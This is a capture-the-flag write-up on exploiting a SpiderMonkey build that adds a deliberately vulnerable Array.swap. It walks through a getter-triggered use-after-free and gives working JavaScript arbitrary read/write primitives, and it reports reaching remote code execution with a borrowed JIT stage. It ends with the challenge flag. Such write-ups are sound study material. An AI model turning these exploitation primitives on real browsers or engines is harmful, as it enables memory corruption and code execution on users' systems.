# TISC CSIT Challenge 8 — Super "Optimised" Swap

**Category:** Pwn
**Challenge:** Exploit SpiderMonkey to get the flag.  

---

## Summary
This is my first pwn ctf challenge and I am super happy to have completed it!

We are given the source files of SpiderMonkey shell binary. There is a diff.txt file that adds in a new function Array.swap() to the shell:

```txt
+
+bool js::array_swap(JSContext* cx, unsigned argc, Value* vp) {
+  AutoJSMethodProfilerEntry pseudoFrame(cx, "Array.prototype", "swap");
+  CallArgs args = CallArgsFromVp(argc, vp);
+
+  // {obj} refers to this == b
+  RootedObject obj(cx, ToObject(cx, args.thisv()));
+  if (!obj) {
+    return false;
+  }
+
+  NativeObject* nobj = &obj->as<NativeObject>();
+  
+  uint64_t len;
+  if (!GetLengthPropertyInlined(cx, obj, &len)) {
+    args.rval().setBoolean(false);
+    return false;
+  }
+
+  if (!CanOptimizeForDenseStorage<ArrayAccess::Read>(obj, len)) {
+    JS_ReportErrorASCII(cx, "Cannot optimize for array object");
+    args.rval().setBoolean(false);
+    return false;
+  }
+
+  uint64_t capacity;
+  capacity = nobj->getDenseCapacity();
+
+  const js::Value* elements2 = nobj->getDenseElements();
+
+  #if defined(DEBUG) || defined(JS_JITSPEW)
+    printf("Current object: %p\n", static_cast<void*>(nobj));
+    printf("Current length/capacity: %lu / %lu\n",  len, capacity);
+    printf("elements: %p\n", elements2);
+  #endif
+
+
+  RootedValue from(cx);
+  JSAtom* fromAtom = Atomize(cx, "from", strlen("from"));
+  if (!fromAtom) {
+    return false;
+  }
+  RootedId fromId(cx, AtomToId(fromAtom));
+  if (!GetProperty(cx, obj, obj, fromId, &from)) {
+      args.rval().setBoolean(false);
+      return true;
+  }
+
+  if (!from.isInt32()){
+    JS_ReportErrorASCII(cx, "from is not Int32");
+    args.rval().setBoolean(false);
+    return true;
+  }
+
+
+  RootedValue to(cx);
+  JSAtom* toAtom = Atomize(cx, "to", strlen("to"));
+  if (!toAtom) {
+    return false;
+  }
+  RootedId toId(cx, AtomToId(toAtom));
+  if (!GetProperty(cx, obj, obj, toId, &to)) {
+      args.rval().setBoolean(false);
+      return true;
+  }
+
+  if (!to.isInt32()){
+    JS_ReportErrorASCII(cx, "to property is not Int32");
+    args.rval().setBoolean(false);
+    return true;
+  }
+  
+  // truncate - should be fine
+  uint64_t fromVal = from.toInt32();
+  uint64_t toVal = to.toInt32();
+
+  #if defined(DEBUG) || defined(JS_JITSPEW)
+    printf("fromVal: %ld\n", fromVal);  
+    printf("toVal: %ld\n", toVal);
+  #endif
+
+
+  if (fromVal < len 
+      && toVal < len
+      && fromVal < capacity    
+      && toVal < capacity)    
+  {
+    Value tmp = elements2[toVal]; 
+    Value tmp2 = elements2[fromVal]; 
+
+    #if defined(DEBUG) || defined(JS_JITSPEW)
+      printf("To:\n");
+      js::DumpValue(tmp);
+
+      printf("From:\n");
+      js::DumpValue(tmp2);
+    #endif
+
+    memcpy((void*)&elements2[fromVal], &tmp, sizeof(js::Value));
+    memcpy((void*)&elements2[toVal], &tmp2, sizeof(js::Value));
+
+
+    args.rval().setBoolean(true);  
+  }
+  else
+  {
+    JS_ReportErrorASCII(cx, "Index larger than length!");
+    args.rval().setBoolean(false);  
+  }
+  
+  return true;
+}
+
```

Before analysing this function, I did some research on SpiderMonkey exploits,previous ctfs and chanced upon this ctf writeup:  https://vuln.dev/browser-exploitation-firefox-oob-to-rce/ 

The challenge seemed super similar to this one with the difference being the vulnerable added function. 

Researching SpiderMonkey, I learned that arrays can be inline (elements stored immediately after the header) or out-of-line (header contains a pointer to a separate elements area). Uint8Array can often be inline (single-byte elements), while BigUint64Array is only out-of-line. This matters because if we can control a BigUint64Array’s elements pointer in its header, we can gain arbitrary read/write. The inline property of Uint8Array is useful because it allows predictable writes into the freed/allocated region. We can write bytewise with Uint8Array and control pointer bits for the BigUint64Array.

Back to the ctf-writeup, after the arbitrary read and write they exploited a SpiderMonkey JIT optimization vulnerability: by repeatedly converting attacker-controlled byte sequences into JavaScript functions, they forced the engine’s runtime optimizer to compile those inputs into native code. Then they overwrite the pointer of a BigUint64Array to the new vulnerable compiled function causing RCE.

Now, I am sure that our attack workflow will be the same except the way we get the arbitrary read and write will be different. Time for us to analyse diff.txt again.

Our new Array.swap vuln function does 3 main steps :
1. Get the array object length and the pointer to its elements:
```txt
+  uint64_t capacity;
+  capacity = nobj->getDenseCapacity();
+
+  const js::Value* elements2 = nobj->getDenseElements();
```

2. Call GetProperty which invokes the getter of the array object:
```txt
 (!GetProperty(cx, obj, obj, fromId, &from)) {
+      args.rval().setBoolean(false);
+      return true;
+  }
+
```

3.  Verify the to and from values returned by the getter are less than length/capacity.

4. Use elements2 (the pointer captured in step 1) and from/to to memcpy Values:
```txt
+  {
+    Value tmp = elements2[toVal]; 
+    Value tmp2 = elements2[fromVal]; 
+
+    #if defined(DEBUG) || defined(JS_JITSPEW)
+      printf("To:\n");
+      js::DumpValue(tmp);
+
+      printf("From:\n");
+      js::DumpValue(tmp2);
+    #endif
+
+    memcpy((void*)&elements2[fromVal], &tmp, sizeof(js::Value));
+    memcpy((void*)&elements2[toVal], &tmp2, sizeof(js::Value));
+
+
+    args.rval().setBoolean(true);  
+  }
```
And we spot the vulnerability, the getter (invoked in step 2) is attacker-controlled JavaScript!
Given that the getter is called after the array pointer is returned in step1. This means that we can overwrite the getter with a javascript function that changes the memory layout such that the array pointer returned in step1 that is used in step 4 is no longer pointing to the same array!

### Exploit Idea (high level)
If we create a large inline array called setup-array (simplified example):
```css
[setup_1] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] 
```
Call swap() in a way that reads the elements pointer (step 1), then invokes a getter we control.
In the getter, delete setup-array, force GC so the region becomes free, then allocate:
- a Uint8Array (inline) at the freed slot, and
- a BigUint64Array (out-of-line header) in the same region.
Example layout of the exact same memory region after reallocation:
```css
[Uint8Array] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [BigInt64Array] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] 
```

When we reach step 4 and  we can end up swapping an element from Uint8Array with the pointer bits of the BigInt64Array since step4 uses the same pointer from step1 and allows swap anywhere within the length of the initial array. 

Turns out we can delete the setup-array, call garbage collection to mark the space as free such that when we create Uint8Array and BigInt64Array they will be allocated to the newly freed space, thus taking the exact space initially taken by setup-array. 

With a lot of try and error and debugging this was my final exploit script achieving arb read and write to any address we want. 

```js


function read64(addr) {
    gc();
    gc();
    var writer;
    var obj = new Array(1);
    var obj1 = new Array(30).fill(1);
    objectAddress(obj1);

    Object.defineProperty(obj1, "to", {
        configurable: true,
        enumerable: true,
        get() {
            console.log("Getter for 'to' called");
            change_element2();
            return 8;
        }
    });

    function change_element2() {
        console.log("change_element2 called");
        console.log(objectAddress(obj1));
        obj1 = null; 
        gc();
        gc();
        gc();
        var obj2 = new Uint8Array([1,2,3,4,5,6,7,8]);
        var buf = new ArrayBuffer(8);
        writer = new BigUint64Array(buf);
        if (addr < 0n) {
            const mod = 1n << BigInt(8 * 8);
            addr = (mod + addr) & (mod - 1n);
          }
          for (let i = 0; i < 8; i++) {
            obj2[i] = Number(addr & 0xffn);
            addr >>= 8n;
          }
        obj2 = null;
        buf = null;
        gc();
        gc();
        
    }

    obj1.from = 19;
    obj1.swap();
    console.log(objectAddress(writer));
    out=writer[0];
    writer = null;
    gc();
    gc();
    return out
}


function write64(addr,value) {
    gc();
    gc();
    var writer;
    var obj = new Array(1);
    var obj1 = new Array(30).fill(1);
    objectAddress(obj1);

    Object.defineProperty(obj1, "to", {
        configurable: true,
        enumerable: true,
        get() {
            console.log("Getter for 'to' called");
            change_element2();
            return 8;
        }
    });

    function change_element2() {
        console.log("change_element2 called");
        console.log(objectAddress(obj1));
        obj1 = null; 
        gc();
        gc();
        gc();
        var obj2 = new Uint8Array([1,2,3,4,5,6,7,8]);
        var buf = new ArrayBuffer(8);
        writer = new BigUint64Array(buf);
        if (addr < 0n) {
            const mod = 1n << BigInt(8 * 8);
            addr = (mod + addr) & (mod - 1n);
          }
          for (let i = 0; i < 8; i++) {
            obj2[i] = Number(addr & 0xffn);
            addr >>= 8n;
          }
        obj2 = null;
        buf = null;
    }

    obj1.from = 19;
    obj1.swap();
    console.log(objectAddress(writer));
    writer[0]=value;
    writer = null;
    gc();
    gc();
    return out
}
```

Combining with the JIT exploit from the writeup (I made no modifications to the jit part), we get our full exploit script. Testing it on the server we successfully get RCE and enter the server's shell and we can cat the flag.


**Flag:** 
TISC{sp1d3rm0nk3y_sw4p_p4ws_y3kn0mr3d1ps}
